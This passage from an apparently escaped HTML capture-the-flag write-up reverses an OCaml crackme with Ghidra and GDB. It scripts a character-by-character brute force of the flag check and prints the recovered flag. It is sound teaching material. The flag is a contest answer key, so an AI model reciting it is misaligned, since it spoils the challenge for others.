&lt;/span>&lt;span style="color:#75715e">&lt;/span>lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__listequal_92();
&lt;span style="color:#75715e">// Exit here after printing an error message if the check failed.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
camlStdlib__print_endline_361();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#75715e">// And finally, print a message if we got the right flag.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
camlStdlib__exit_459();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once again, let&amp;rsquo;s take the easy route. We&amp;rsquo;ll extract the flag using GDB, by looking at the check functions.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">...
gefâž¤ disassemble camlReverse__firstCheck_268
Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__firstCheck_268:
0x0000555555574100 &amp;lt;+0&amp;gt;: sub rsp,0x18
0x0000555555574104 &amp;lt;+4&amp;gt;: cmp rax,0x1
0x0000555555574108 &amp;lt;+8&amp;gt;: je 0x555555574154 &amp;lt;camlReverse__firstCheck_268+84&amp;gt;
0x000055555557410a &amp;lt;+10&amp;gt;: cmp rbx,0x1
0x000055555557410e &amp;lt;+14&amp;gt;: je 0x555555574148 &amp;lt;camlReverse__firstCheck_268+72&amp;gt;
0x0000555555574110 &amp;lt;+16&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>,rbx
0x0000555555574114 &amp;lt;+20&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>,rax
0x0000555555574119 &amp;lt;+25&amp;gt;: mov rsi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rbx&lt;span style="color:#f92672">]&lt;/span>
0x000055555557411c &amp;lt;+28&amp;gt;: mov rdi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>
0x000055555557411f &amp;lt;+31&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rip+0x11a2a&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># 0x555555585b50 &amp;lt;caml_equal&amp;gt;&lt;/span>
0x0000555555574126 &amp;lt;+38&amp;gt;: call 0x55555559b81c &amp;lt;caml_c_call&amp;gt;
0x000055555557412b &amp;lt;+43&amp;gt;: mov r15,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>r14&lt;span style="color:#f92672">]&lt;/span>
0x000055555557412e &amp;lt;+46&amp;gt;: cmp rax,0x1
0x0000555555574132 &amp;lt;+50&amp;gt;: je 0x555555574164 &amp;lt;camlReverse__firstCheck_268+100&amp;gt;
0x0000555555574134 &amp;lt;+52&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>
0x0000555555574138 &amp;lt;+56&amp;gt;: mov rbx,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
0x000055555557413c &amp;lt;+60&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>
0x0000555555574141 &amp;lt;+65&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
0x0000555555574145 &amp;lt;+69&amp;gt;: jmp 0x555555574104 &amp;lt;camlReverse__firstCheck_268+4&amp;gt;
0x0000555555574147 &amp;lt;+71&amp;gt;: nop
0x0000555555574148 &amp;lt;+72&amp;gt;: mov eax,0x3
0x000055555557414d &amp;lt;+77&amp;gt;: add rsp,0x18
0x0000555555574151 &amp;lt;+81&amp;gt;: ret
0x0000555555574152 &amp;lt;+82&amp;gt;: xchg ax,ax
0x0000555555574154 &amp;lt;+84&amp;gt;: cmp rbx,0x1
0x0000555555574158 &amp;lt;+88&amp;gt;: je 0x555555574164 &amp;lt;camlReverse__firstCheck_268+100&amp;gt;
0x000055555557415a &amp;lt;+90&amp;gt;: mov eax,0x1
0x000055555557415f &amp;lt;+95&amp;gt;: add rsp,0x18
0x0000555555574163 &amp;lt;+99&amp;gt;: ret
0x0000555555574164 &amp;lt;+100&amp;gt;: mov eax,0x1
0x0000555555574169 &amp;lt;+105&amp;gt;: add rsp,0x18
0x000055555557416d &amp;lt;+109&amp;gt;: ret
End of assembler dump.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function looks like a simple character check in a loop. Let&amp;rsquo;s confirm this by looking at the parameters passed to &lt;code>caml_c_call&lt;/code> (used to call &lt;code>caml_equal&lt;/code>).&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ b *0x0000555555574126
Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x555555574126
gefâž¤ r ABCDEFG
gefâž¤ p $rdi
$1 &lt;span style="color:#f92672">=&lt;/span> 0x83
gefâž¤ p $rsi
$2 &lt;span style="color:#f92672">=&lt;/span> 0x87
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The values don&amp;rsquo;t match. Let&amp;rsquo;s run it again with the known flag format:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ r CYBERTF
gefâž¤ p $rdi
$1 &lt;span style="color:#f92672">=&lt;/span> 0x87
gefâž¤ p $rsi
$2 &lt;span style="color:#f92672">=&lt;/span> 0x87
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The values match. Hitting &lt;code>continue&lt;/code> brings us to the next comparison. Let&amp;rsquo;s script this out:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
alphabet &lt;span style="color:#f92672">=&lt;/span> (
&lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>ascii_uppercase &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>digits &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>punctuation
)
found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
running &lt;span style="color:#f92672">=&lt;/span> True
&lt;span style="color:#66d9ef">while&lt;/span> running:
&lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
&lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
&lt;span style="color:#66d9ef">continue&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(found &lt;span style="color:#f92672">+&lt;/span> char)
&lt;span style="color:#75715e"># Run the program.&lt;/span>
gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
&lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> len(found):
gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#39;continue &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(len(found)))
&lt;span style="color:#75715e"># Get the values of the registers.&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span>:
rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
&lt;span style="color:#66d9ef">except&lt;/span>:
running &lt;span style="color:#f92672">=&lt;/span> False
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
found &lt;span style="color:#f92672">+=&lt;/span> char
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ source extract_start.py
...
&lt;span style="color:#f92672">[&lt;/span>Inferior &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>process 1287983&lt;span style="color:#f92672">)&lt;/span> exited normally&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">=&lt;/span>&amp;gt; CYBERTF&lt;span style="color:#f92672">{&lt;/span>Go
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we get the start of the flag: &lt;code>CYBERTF{Go&lt;/code>. Now let&amp;rsquo;s look at the other function. We&amp;rsquo;ll assume it checks the remaining part of the flag.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ disassemble camlReverse__listequal_92
Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__listequal_92:
0x0000555555573e20 &amp;lt;+0&amp;gt;: sub rsp,0x18
0x0000555555573e24 &amp;lt;+4&amp;gt;: cmp rax,0x1
0x0000555555573e28 &amp;lt;+8&amp;gt;: je 0x555555573e74 &amp;lt;camlReverse__listequal_92+84&amp;gt;
0x0000555555573e2a &amp;lt;+10&amp;gt;: cmp rbx,0x1
0x0000555555573e2e &amp;lt;+14&amp;gt;: je 0x555555573e84 &amp;lt;camlReverse__listequal_92+100&amp;gt;
0x0000555555573e30 &amp;lt;+16&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>,rbx
0x0000555555573e34 &amp;lt;+20&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>,rax
0x0000555555573e39 &amp;lt;+25&amp;gt;: mov rsi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rbx&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e3c &amp;lt;+28&amp;gt;: mov rdi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e3f &amp;lt;+31&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rip+0x11d0a&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># 0x555555585b50 &amp;lt;caml_equal&amp;gt;&lt;/span>
0x0000555555573e46 &amp;lt;+38&amp;gt;: call 0x55555559b81c &amp;lt;caml_c_call&amp;gt;
0x0000555555573e4b &amp;lt;+43&amp;gt;: mov r15,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>r14&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e4e &amp;lt;+46&amp;gt;: cmp rax,0x1
0x0000555555573e52 &amp;lt;+50&amp;gt;: je 0x555555573e68 &amp;lt;camlReverse__listequal_92+72&amp;gt;
0x0000555555573e54 &amp;lt;+52&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e58 &amp;lt;+56&amp;gt;: mov rbx,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e5c &amp;lt;+60&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e61 &amp;lt;+65&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
0x0000555555573e65 &amp;lt;+69&amp;gt;: jmp 0x555555573e24 &amp;lt;camlReverse__listequal_92+4&amp;gt;
0x0000555555573e67 &amp;lt;+71&amp;gt;: nop
0x0000555555573e68 &amp;lt;+72&amp;gt;: mov eax,0x1
0x0000555555573e6d &amp;lt;+77&amp;gt;: add rsp,0x18
0x0000555555573e71 &amp;lt;+81&amp;gt;: ret
0x0000555555573e72 &amp;lt;+82&amp;gt;: xchg ax,ax
0x0000555555573e74 &amp;lt;+84&amp;gt;: cmp rbx,0x1
0x0000555555573e78 &amp;lt;+88&amp;gt;: jne 0x555555573e84 &amp;lt;camlReverse__listequal_92+100&amp;gt;
0x0000555555573e7a &amp;lt;+90&amp;gt;: mov eax,0x3
0x0000555555573e7f &amp;lt;+95&amp;gt;: add rsp,0x18
0x0000555555573e83 &amp;lt;+99&amp;gt;: ret
0x0000555555573e84 &amp;lt;+100&amp;gt;: mov eax,0x1
0x0000555555573e89 &amp;lt;+105&amp;gt;: add rsp,0x18
0x0000555555573e8d &amp;lt;+109&amp;gt;: ret
End of assembler dump.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have the same pattern here, let&amp;rsquo;s just quickly adapt the script.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
alphabet &lt;span style="color:#f92672">=&lt;/span> (
&lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>ascii_uppercase &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>digits &lt;span style="color:#f92672">+&lt;/span>
string&lt;span style="color:#f92672">.&lt;/span>punctuation
)
found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CYBERTF{Go&amp;#39;&lt;/span>
start_len &lt;span style="color:#f92672">=&lt;/span> len(found)
running &lt;span style="color:#f92672">=&lt;/span> True
&lt;span style="color:#66d9ef">while&lt;/span> running:
&lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
&lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
&lt;span style="color:#66d9ef">continue&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(found &lt;span style="color:#f92672">+&lt;/span> char)
&lt;span style="color:#75715e"># Run the program.&lt;/span>
gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
&lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> len(found) &lt;span style="color:#f92672">-&lt;/span> start_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#39;continue &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(len(found) &lt;span style="color:#f92672">-&lt;/span> start_len))
&lt;span style="color:#75715e"># Get the values of the registers.&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span>:
rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
&lt;span style="color:#66d9ef">except&lt;/span>:
running &lt;span style="color:#f92672">=&lt;/span> False
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
found &lt;span style="color:#f92672">+=&lt;/span> char
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ &lt;span style="color:#75715e"># Remove the previous breakpoint first.&lt;/span>
gefâž¤ del &lt;span style="color:#ae81ff">1&lt;/span>
gefâž¤ d *0x0000555555573e46
Breakpoint &lt;span style="color:#ae81ff">2&lt;/span> at 0x555555573e46
gefâž¤ source extract_end.py
...
&lt;span style="color:#f92672">[&lt;/span>Inferior &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>process 1294818&lt;span style="color:#f92672">)&lt;/span> exited normally&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">=&lt;/span>&amp;gt; CYBERTF&lt;span style="color:#f92672">{&lt;/span>Golang_is_D3@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here is the flag: &lt;code>CYBERTF{Golang_is_D3@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188}&lt;/code>.&lt;/p>
&lt;p>It took around 4 minutes for it to finish.&lt;/p>
&lt;h2 id="additional-notes">Additional notes&lt;/h2>
&lt;p>I&amp;rsquo;ve been wanting to learn about Ghidra&amp;rsquo;s python API for a while now, so I decided after writing the post above to take a deeper look at how things are implemented, and to write a script that&amp;rsquo;ll extract the flag.&lt;/p>
&lt;p>Let&amp;rsquo;s first check out &lt;code>camlReverse__string2char_211&lt;/code>, by breaking right before it is called.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gdb ./program
gefâž¤ &lt;span style="color:#75715e"># Break right before camlReverse__string2char_211 is called.&lt;/span>
gefâž¤ b *0x0000555555574278
gefâž¤ r ABCDEFG
gefâž¤ &lt;span style="color:#75715e"># The argument is loaded into rax, printing it reveals our flag (ABCDEFG).&lt;/span>
gefâž¤ x/2x $rax
0x7ffff7c7ffa8: 0x44434241 0x00474645
gefâž¤ &lt;span style="color:#75715e"># Now let&amp;#39;s run the function.&lt;/span>
gefâž¤ stepi
gefâž¤ next
gefâž¤ next
gefâž¤ &lt;span style="color:#75715e"># When we&amp;#39;re back into main, we see that the structure changed quite a bit.&lt;/span>
gefâž¤ x/2x $rax
0x7ffff7c7fd30: 0x00000083 0x00000000
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking at the function in Ghidra, it seems recursive:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_211&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;span style="color:#66d9ef">long&lt;/span> in_RAX;
camlReverse__string2char_tmp_214
(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#f92672">*&lt;/span>(undefined &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_tmp_214&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1) {
&lt;span style="color:#66d9ef">long&lt;/span> lVar1;
&lt;span style="color:#66d9ef">long&lt;/span> in_RAX;
undefined8 uVar2;
&lt;span style="color:#66d9ef">long&lt;/span> unaff_RBX;
&lt;span style="color:#66d9ef">long&lt;/span> unaff_R14;
&lt;span style="color:#66d9ef">long&lt;/span> unaff_R15;
&lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> unaff_RBX) {
&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x1&lt;/span>;
}
uVar2 &lt;span style="color:#f92672">=&lt;/span> camlReverse__string2char_tmp_214(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (unaff_R15 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x18U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(unaff_R14 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)) {
uVar2 &lt;span style="color:#f92672">=&lt;/span> caml_call_gc();
}
&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x800&lt;/span>;
lVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> ((ulong)(param_1 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)&lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> lVar1)) {
&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> (ulong)&lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> (param_1 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> uVar2;
&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>);
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
caml_ml_array_bound_error();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The most interesting part is the &lt;code>* 2 + 1&lt;/code> operation. Our &lt;code>0x83&lt;/code> value really is &lt;code>0x41 * 2 + 1&lt;/code>. If we show a bit more of the memory, we can find the other chars:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gefâž¤ x/64x $rax
0x7ffff7c7fd30: 0x00000083 0x00000000 0xf7c7fd48 0x00007fff
0x7ffff7c7fd40: 0x00000800 0x00000000 0x00000085 0x00000000
0x7ffff7c7fd50: 0xf7c7fd60 0x00007fff 0x00000800 0x00000000
0x7ffff7c7fd60: 0x00000087 0x00000000 0xf7c7fd78 0x00007fff
0x7ffff7c7fd70: 0x00000800 0x00000000 0x00000089 0x00000000
0x7ffff7c7fd80: 0xf7c7fd90 0x00007fff 0x00000800 0x00000000
0x7ffff7c7fd90: 0x0000008b 0x00000000 0xf7c7fda8 0x00007fff
0x7ffff7c7fda0: 0x00000800 0x00000000 0x0000008d 0x00000000
0x7ffff7c7fdb0: 0xf7c7fdc0 0x00007fff 0x00000800 0x00000000
0x7ffff7c7fdc0: 0x0000008f 0x00000000 0x00000001 0x00000000
0x7ffff7c7fdd0: 0x000004fc 0x00000000 0x00000000 0x07000000
0x7ffff7c7fde0: 0x00000400 0x00000000 0x555b8960 0x00005555
0x7ffff7c7fdf0: 0x000008f8 0x00000000 0x555b8b60 0x00005555
0x7ffff7c7fe00: 0x00000003 0x00000000 0x00000400 0x00000000
0x7ffff7c7fe10: 0x00000001 0x00000000 0x00000c00 0x00000000
0x7ffff7c7fe20: 0xf7c7fe40 0x00007fff 0x00000081 0x00000000
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have &lt;code>0x83, 0x85, 0x87, ...&lt;/code>. This maps to our input, meaning we can get the start of the flag by decoding these values.&lt;/p>
&lt;p>Also, we notice that each value has a pointer to the next one, meaning this is a linked list. We can build a first script to decode the start of the flag:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
&lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
